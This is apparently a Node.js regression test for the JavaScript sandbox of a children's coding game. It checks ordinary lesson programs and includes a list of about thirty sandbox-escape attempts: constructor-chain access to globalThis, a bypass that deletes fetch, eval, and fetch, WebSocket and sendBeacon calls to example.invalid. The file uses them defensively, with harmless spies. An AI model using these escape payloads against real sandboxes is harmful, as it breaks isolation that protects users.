'use strict';
/* Exercise the actual worker source with an intentionally network-capable host.
 * Every network method below is a harmless spy, never a real request.
 */
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const source = fs.readFileSync(path.join(__dirname, '../docs/arcade/code-quest/sandbox.js'), 'utf8');
const { runTeachingProgram: run, LIMITS } = require('../docs/arcade/code-quest/sandbox.js');
let checks = 0;
function good(code) {
  const result = run(code); assert.equal(result.ok, true, result.error + '\n' + code); checks++; return result;
}
function bad(code, pattern) {
  const result = run(code); assert.equal(result.ok, false, 'Unexpectedly accepted: ' + String(code).slice(0, 120));
  assert.equal(typeof result.error, 'string'); if (pattern) assert.match(result.error, pattern); checks++; return result;
}

assert.deepEqual(good('say("Hello, PIX!");').actions, [{ type: 'say', value: 'Hello, PIX!' }]);
assert.deepEqual(good('let crystals = 3; charge(crystals);').actions, [{ type: 'charge', value: 3 }]);
assert.deepEqual(good('move(2); turn("right"); move(2);').actions.map(a => a.value), [2, 'right', 2]);
assert.equal(good('let keys=2; if(keys >= 2){openGate();}').actions[0].type, 'openGate');
assert.equal(good('for(let step=0;step<4;step++){move(1);}').actions.length, 4);
assert.deepEqual(good('const stars=[1,2,3];for(const star of stars){collect(star);}').actions.map(a => a.value), [1,2,3]);
assert.equal(good('function lightBeacon(){charge(3);say("Light Starlight Bay!");}lightBeacon();').actions.length, 2);
assert.equal(good('function power(a,b){return a+b;} charge(power(2,3));').actions[0].value, 5);
assert.equal(good('let n=1;n+=3;n--;n=n*2;charge(n);').actions[0].value, 6);
assert.equal(good('let n=0;while(n<3){n++;}charge(n);').actions[0].value, 3);
assert.equal(good('let x=2;if(!(x<1)&&x===2||false){say("yes");}else{say("no");}').actions[0].value, 'yes');
assert.equal(good('/* comments */ charge(10%3+6/2-1); // hello').actions[0].value, 3);
assert.equal(good('say("A"+" bright night");').actions[0].value, 'A bright night');
assert.deepEqual(good('const empty=[];for(const n of empty){move(n);}').features.includes('forOf'), false);
assert.deepEqual(good('function unused(){for(let i=0;i<2;i++){move(1);}} say("hello");').features.includes('functions'), false);
const used = good('const stars=[1,2];function gather(){for(const star of stars){if(star>0){collect(star);}}}gather();');
for (const feature of ['variables','arrays','functions','forOf','if']) assert.ok(used.features.includes(feature), feature);
assert.ok(good('charge(2+3);').features.includes('arithmetic'));
assert.equal(good('if(false){charge(2+3);}').features.includes('arithmetic'), false);
assert.ok(good('if(false){say("no");}else{say("yes");}').features.includes('else'));
assert.equal(good('if(true){say("yes");}else{say("no");}').features.includes('else'), false);
assert.ok(good('function light(amount){charge(amount);}light(3);').features.includes('parameters'));
assert.equal(good('function light(amount){charge(amount);}charge(3);').features.includes('parameters'), false);
// Dangerous-looking names are ordinary private map keys, not a name blocklist.
assert.equal(good('let fetch=3;let constructor=2;let __proto__=1;charge(fetch+constructor+__proto__);').actions[0].value, 6);
assert.equal(good('if(false){missing();}say("still here");').actions.length, 1);
for (const punctuation of ['!', '-', '+', '(', ')', '[', ']', '{', '}', ';', '<end>', 'if', 'function']) {
  assert.equal(good('say('+JSON.stringify(punctuation)+');').actions[0].value, punctuation);
}
bad('"<end>";fetch("https://example.invalid/regression-only");', /lesson command/);

bad('say(Hello);', /not defined/);
bad('say("Hello);', /quotation/);
bad('const value=1;value=2;', /const/);
bad('let n=1;let n=2;', /already/);
bad('let charge=2;charge(3);', /lesson command/);
bad('function charge(){say("override");}charge();', /lesson command/);
bad('function f(){}let f=4;f();', /already/);
bad('function f(){} {let f=4;f();}', /not a function/);
bad('move(0);', /whole number/);
bad('charge(1/0);', /divided by zero/);
bad('charge(1000000*2);', /large/);
bad('say("'+'x'.repeat(151)+'");', /short message/);
bad('for(const item of 1){collect(item);}', /list/);
bad('return 1;', /inside a function/);
bad('function f(a,a){}', /own name/);
bad('say();', /1 input/);
bad('function f(a){}f();', /1 input/);
bad('function forever(){forever();}forever();', /nested calls/);
bad('while(true){}', /loop|work/);
bad('for(let n=0;n>=0;n++){}', /loop|work/);
bad('for(let n=0;n<65;n++){say("hello");}', /64 actions/);
assert.equal(good('for(let n=0;n<64;n++){say("hello");}').actions.length, LIMITS.actions);
bad(' '.repeat(6001), /6,000/);
bad('let a='+'('.repeat(100)+'1'+')'.repeat(100)+';', /nested/);
bad('let a='+'['.repeat(100)+'1'+']'.repeat(100)+';', /nested/);
bad('let a=['+Array(33).fill('1').join(',')+'];', /32/);
bad(';'.repeat(2001), /pieces/);
bad(null, /6,000/);

const observations = [], responses = [];
const spy = name => (...args) => { observations.push({ name, args }); return {}; };
const inheritedHost = {
  fetch: spy('inherited fetch'), XMLHttpRequest: spy('inherited XMLHttpRequest'),
  WebSocket: spy('inherited WebSocket'), EventSource: spy('inherited EventSource'),
  importScripts: spy('inherited importScripts')
};
// Confirm the regression harness models the reported deletion bypass exactly.
const vulnerableSelf = Object.create(inheritedHost);
vulnerableSelf.fetch = () => { throw new Error('blocked own shadow'); };
vm.runInNewContext('delete self.fetch; self.fetch("https://example.invalid/regression-only");', { self: vulnerableSelf });
assert.equal(observations.length, 1); assert.equal(observations[0].name, 'inherited fetch'); observations.length = 0;

const worker = Object.create(inheritedHost);
worker.postMessage = value => responses.push(value);
const context = vm.createContext({ self: worker, fetch: spy('global fetch'), WebSocket: spy('global WebSocket'),
  XMLHttpRequest: spy('global XMLHttpRequest'), importScripts: spy('global importScripts') }, { codeGeneration: { strings: false, wasm: false } });
vm.runInContext(source, context, { timeout: 1000 });
assert.equal(typeof worker.onmessage, 'function');
const attacks = [
  'delete self.fetch; self.fetch("https://example.invalid/regression-only");',
  'delete globalThis.fetch; fetch("https://example.invalid/regression-only");',
  'fetch("https://example.invalid/regression-only");',
  'self.fetch("https://example.invalid/regression-only");',
  'globalThis["fetch"]("https://example.invalid/regression-only");',
  'importScripts("https://example.invalid/regression-only");',
  'import("https://example.invalid/regression-only");',
  'new WebSocket("wss://example.invalid/regression-only");',
  'new XMLHttpRequest();',
  'new EventSource("https://example.invalid/regression-only");',
  'say.constructor("return globalThis")().fetch("https://example.invalid/regression-only");',
  '[]["filter"]["constructor"]("return globalThis")();',
  'constructor.constructor("return globalThis")();',
  'Function("return globalThis")();',
  'eval("fetch(1)");',
  'let leak=this; say(leak);',
  'postMessage({ok:true,actions:[]});',
  'self.postMessage({ok:true,actions:[]});',
  'onmessage=fetch;',
  'Object.getPrototypeOf(self).fetch("https://example.invalid/regression-only");',
  'Reflect.get(self,"fetch")("https://example.invalid/regression-only");',
  'let x={get value(){fetch("https://example.invalid/regression-only");}};',
  'let x=`${fetch("https://example.invalid/regression-only")}`;',
  'let \\u0066etch=1; fetch(1);',
  'let x=[];x.__proto__.constructor;',
  'setTimeout("fetch(1)",0);',
  'navigator.sendBeacon("https://example.invalid/regression-only","test");',
  'close();',
  'location="https://example.invalid/regression-only";'
];
for (const attack of attacks) {
  const previous = responses.length; worker.onmessage({ data: { code: attack } });
  assert.equal(responses.length, previous + 1, 'Must produce exactly one controlled response');
  const response = responses.at(-1); assert.equal(response.ok, false, 'Accepted host escape: '+attack);
  assert.equal(observations.length, 0, 'A host/network spy ran: '+attack); checks++;
}
worker.onmessage({data:{code:'say("fetch and constructor are just text");'}});
assert.equal(responses.at(-1).ok,true);
assert.equal(observations.length,0);
console.log('Code Quest interpreter passed '+checks+' programs, including '+attacks.length+' host escapes; exact inherited-fetch deletion reproduced in harmless baseline and rejected by actual worker.');
